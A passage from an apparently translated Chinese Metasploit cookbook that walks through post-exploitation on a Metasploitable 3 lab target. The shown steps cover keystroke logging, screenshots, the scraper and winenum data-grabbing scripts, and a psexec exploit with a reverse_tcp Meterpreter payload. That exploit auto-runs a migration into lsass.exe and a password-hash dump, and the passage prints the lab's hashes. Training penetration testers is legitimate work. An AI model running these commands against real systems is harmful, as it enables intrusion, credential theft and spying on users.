
- 7. 要捕获登录密码，请登录到 Metasploitable 3 机器，然后使用 `keyscan_dump` Meterpreter 命令转储按键记录：

```
meterpreter > keyscan_dump
Dumping captured keystrokes...
<LAlt><^Delete>vagrant<CR>
```

- 8. 同样，我们可以通过迁移到在默认桌面上运行的任何进程来返回到默认桌面；例如，`explorer.exe`：

```
meterpreter > migrate -N explorer.exe
[*] Migrating from 5736 to 5168...
[*] Migration completed successfully.
```

你可能已经注意到，为嗅探按键而迁移到不同的进程和桌面环境的重要性。通常，如果不查看当前活动桌面就直接运行 keyscan，人们不会得到任何结果。这是因为他们渗透的进程可能属于不同的会话或站。因此，在处理按键嗅探时，请牢记这一概念。

## 还有更多...

一旦我们在 Meterpreter 会话中，你就可以使用 `screenshot` 命令轻松截取一些屏幕截图：

```
meterpreter > screenshot
Screenshot saved to: /root/jUEOMRHK.jpeg
```

要显示捕获的屏幕截图，你可以在新的终端窗口中使用 eog 命令：

```
root@kali:~# eog jUEOMRHK.jpeg
```

![](img/6b6e557533100c0e47951d0e5e14c4ee_511_0.png)

## 使用 scraper Meterpreter 脚本

到目前为止，我们已经学习了几个 Meterpreter 命令。在这里，我们将看一个重要的 Meterpreter 脚本，它可以帮助我们更深入地探索目标。本章广泛涵盖了 Meterpreter 脚本，因此在这里，我们将只关注使用该脚本。渗透测试可能需要花费大量时间来挖掘目标上的信息。因此，为渗透测试人员保留有用信息的地方性备份非常方便，这样即使目标宕机，他们仍然有信息可供工作。它也使与其他测试人员共享信息变得容易。Scraper 为我们完成了这项任务。

## 准备工作

scraper Meterpreter 脚本可以挖掘出有关被攻破目标的大量信息，例如注册表信息、密码哈希和网络信息，并将其存储在测试人员的本地机器上。

为了使用 Meterpreter 在目标上执行 Ruby 脚本，我们可以使用 run 命令。让我们继续分析如何将信息下载到本地。

## 如何操作...

脚本在执行后会自动完成所有操作。它会在 /root/.msf4/logs/scripts/scraper/ 下创建一个目录，所有文件都保存在那里：

```
meterpreter > run scraper
[*] New session on 192.168.216.10:445...
[*] Gathering basic system information...
[*] Dumping password hashes...
[*] Obtaining the entire registry...
[*] Exporting HKCU
[*] Downloading HKCU
...
(C:\Users\vagrant\AppData\Local\Temp\2\wBrggef1.reg)
[*] Cleaning HKCR
[*] Exporting HKU
[*] Downloading HKU
(C:\Users\vagrant\AppData\Local\Temp\2\FTmZDWyo.reg)
[*] Cleaning HKU
[*] Completed processing on 192.168.216.10:445...
```

脚本会自动将信息下载并保存在目标文件夹中。让我们看一下源代码，分析是否可以根据我们的需要进行一些更改。

## 其工作原理...

scraper.rb 的源代码位于 /usr/share/metasploit-framework/scripts/meterpreter 下。

Ruby 编程经验可以帮助你编辑脚本以添加自己的功能。我们可以通过编辑以下行来更改下载位置：

```
logs = ::File.join(Msf::Config.log_directory,
'scripts','scraper', host + "_" +
Time.now.strftime("%Y%m%d.%M%S")+sprintf("% .5d",
rand(100000)) )
```

假设你还想获得可用进程列表的结果；你只需在程序主体中添加以下代码行：

```
::File.open(File.join(logs, "process.txt"), "w")
do |fd|
fd.puts(m_exec(client, "tasklist"))
end
```

通过使用一点 Ruby 语言和可重用的代码，你可以轻松修改代码以满足你的需求。

## 使用 winenum 抓取系统

Windows Local Enumeration (WinEnum) 脚本检索有关系统的各种信息，包括环境变量、网络接口、路由、用户账户等等。

## 如何操作...

- 1. winenum 脚本将在目标机器上运行多个命令，例如 arp、net、netstat、netsh 和 wmic 等命令，并将结果存储在我们的本地系统上：

```
meterpreter > run winenum
[*] Running Windows Local Enumeration
Meterpreter Script
[*] New session on 192.168.216.10:445...
[*] Saving general report to
/root/.msf4/logs/scripts/winenum/VAGRANT-2008R2_20171118.2800/
VAGRANT-2008R2_20171118.2800.txt
[*] Output of each individual command is saved to
/root/.msf4/logs/scripts/winenum/
VAGRANT-2008R2_20171118.2800
...
```

```
[*] Getting Tokens...
[*] All tokens have been processed
[*] Done!
meterpreter >
```

- 2. winenum 脚本的输出存储在 /root/.msf4/logs/scripts/winenum/ 文件夹中：

```
root@kali:~# ls /root/.msf4/logs/scripts/
winenum/VAGRANT-2008R2_20171118.2800/VAGRANT-2008R2_20171118.2800.txt
arp__a.txt
cmd_exe__c_set.txt
cscript__nologo_winrm_get_winrm_config.txt
gpresult__SCOPE_COMPUTER__Z.txt
gpresult__SCOPE_USER__Z.txt
...
servermanagercmd_exe__q.txt
tasklist__svc.txt
tokens.txt
root@kali:~#
```

## 使用 AutoRunScript 进行自动化

在渗透测试期间，你希望尽可能自动化，以便专注于需要人工交互的操作。为了简化我们的任务，Metasploit 允许你使用 AUTORUNSCRIPT 指定在收到新的 Meterpreter 会话后会发生什么。

## 如何操作...

- 1. 首先，我们需要创建一个包含要执行的命令的文件。在此示例中，我们将迁移到 lsass.exe 进程并转储 Windows 哈希：

```
root@kali:~# cat autoruncmds.rc
migrate -N lsass.exe
hashdump
```

- 2. 接下来，我们将使用 exploit/windows/smb/psexec 漏洞利用模块来攻破目标，并使用 AUTORUNSCRIPT 指定在收到新会话后立即要执行的命令：

```
msf > use exploit/windows/smb/psexec
msf exploit(psexec) > set RHOST 192.168.216.10
RHOST => 192.168.216.10
msf exploit(psexec) > set SMBUSER Administrator
SMBUSER => Administrator
msf exploit(psexec) > set SMBPASS vagrant
SMBPASS => vagrant
msf exploit(psexec) > set PAYLOAD
windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf exploit(psexec) > set LHOST 192.168.216.5
LHOST => 192.168.216.5
msf exploit(psexec) > set AUTORUNSCRIPT
multi_console_command -r /root/autoruncmds.rc
AUTORUNSCRIPT => multi_console_command -r /root/autoruncmds.rc
msf exploit(psexec) >
```

- 3. 通过设置 AUTORUNSCRIPT，我们可以在会话创建时自动运行脚本。在此示例中，我们将使用 multi_console_command 脚本，它允许我们指定要运行的多个命令。使用 -c 后跟要执行的命令，以双引号括起来并用逗号分隔，或者像我们的示例一样，使用 -r 和包含每行一个命令的文本文件的路径。现在一切准备就绪，我们只需使用 exploit 命令启动攻击即可：

```
meterpreter >
[*] Session ID 1 (192.168.216.5:4444 -> 192.168.216.10:49665) processing AutoRunScript
'multi_console_command -r /root/autoruncmds.rc'
[*] Running Command List ...
[*] Running command migrate -N lsass.exe
[*] Migrating from 576 to 456...
[*] Migration completed successfully.
[*] Running command hashdump
Administrator:500:aad3b435b51404eea ad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
anakin_skywalker::1011:aad3b435b51404eea ad3b435b51404ee:c706f83a7b17a0230e55cde2f3de94fa:::
artoo_detoo:1007:aad3b435b51404eea ad3b435b51404ee:fac6aada8b7afc418b3afea63b7577b4:::
ben_kenobi:1009:aad3b435b51404eea ad3b435b51404ee
```

太棒了！从输出来看，我们在没有任何交互的情况下获得了新会话，迁移到 lsass.exe 进程并转储了 Windows 哈希。

## Meterpreter 资源脚本

与 msfconsole 类似，Meterpreter 也支持资源脚本，允许我们自动化 Meterpreter 命令的使用。

## 如何操作...

- 1. 在 Meterpreter 会话中使用资源脚本之前，我们首先需要创建将放置脚本的目录结构，为此我们将使用带 -p 选项的 mkdir 命令，以便它创建所有父目录：

```
root@kali:~# mkdir -p ~/.msf4/scripts/resource
/meterpreter/
```

- 2. 现在 Meterpreter 资源脚本目录已创建，我们可以开始编写 Meterpreter 资源脚本。对于第一个脚本，我们将从一些获取系统信息的基本命令开始。使用你喜欢的编辑器创建以下脚本：

```
root@kali:~# cat ~/.msf4/scripts/resource/
meterpreter/systeminfo.rc
sysinfo
getuid
getpid
getwd
root@kali:~#
```

- 3. 让我们在 Meterpreter 会话中尝试资源脚本，看看它是如何工作的：

```
meterpreter > resource systeminfo.rc
[*] Processing /root/.msf4/scripts/resource
/meterpreter/systeminfo.rc for ERB directives.
resource (/root/.msf4/scripts/resource
/meterpreter/systeminfo.rc)> sysinfo
Computer : VAGRANT-2008R2
OS : Windows 2008 R2 (Build 7601, Service Pack 1).
```
